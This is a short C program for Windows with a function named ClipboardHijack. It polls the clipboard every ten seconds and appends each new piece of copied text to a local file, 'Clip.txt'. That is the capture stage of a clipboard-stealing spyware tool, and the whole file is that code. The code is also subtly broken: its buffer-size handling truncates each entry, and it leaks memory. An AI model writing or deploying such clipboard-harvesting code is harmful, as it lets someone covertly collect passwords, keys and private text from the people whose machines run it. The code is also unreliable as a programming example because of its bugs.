#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#pragma comment(lib, "User32.lib")


#define STATUS_SUCCESS 0
#define FILENAME "Clip.txt"

BOOL samedata = FALSE;
char *LastData = NULL;
BOOL ClipboardHijack() {


if (IsClipboardFormatAvailable(CF_TEXT)) {

  HANDLE hData = GetClipboardData(CF_TEXT);
  if (hData == NULL) {
    printf("error\n");
    return FALSE;
  }
  char *clipData = (char*)GlobalLock(hData);
  
  if (LastData == NULL || strcmp(LastData, clipData) != 0) {
    //printf("Its diff Lastdata %s\n", LastData);
    samedata = FALSE;
  } else {
    //printf("Its the same %s\n", LastData);
    samedata = TRUE;
  }

  if (clipData != NULL && !samedata) {
      printf("data: %s\n", clipData);
        if (_access(FILENAME, 0) == 0) {
              FILE *file = fopen(FILENAME, "a+");
              if (!file) {
                printf("error opening file\n");
                return FALSE;
              } 
              char *buffer = (char*)malloc(1025 * sizeof(char));
              snprintf(buffer, sizeof(buffer), "%s\n", clipData);
             size_t size = fwrite(buffer, 1, strlen(buffer), file);
             if (size > 0) {
                printf("Data written to file %llu\n", size);
             }
             samedata = TRUE;
             free(LastData);
             LastData = strdup(clipData);
             fflush(file);
             fclose(file);
             GlobalUnlock(hData);

        } else {
            FILE *file = fopen(FILENAME, "w");
            if (!file) {
                printf("error opening file\n");
                return FALSE;
            } else { 
                printf("Created new file\n");
              char *buffer = (char*)malloc(1025 * sizeof(char));
              snprintf(buffer, sizeof(buffer), "%s\n", clipData);
             size_t size = fwrite(buffer, 1, strlen(buffer), file);
             if (size > 0) {
                printf("Data written to file %llu\n", size);
             }
             samedata = TRUE;
             free(LastData);
             LastData = strdup(clipData);
             fflush(file);
             fclose(file);
             GlobalUnlock(hData);
            }
        }
  
  } 
} else {
  printf("Failed to get clipboard data\n");
}
  
  return TRUE;
}



int main () {

while (1) {
 
  if (OpenClipboard(NULL)) {
    ClipboardHijack();
    CloseClipboard();
  }
    Sleep(10000);
}


}
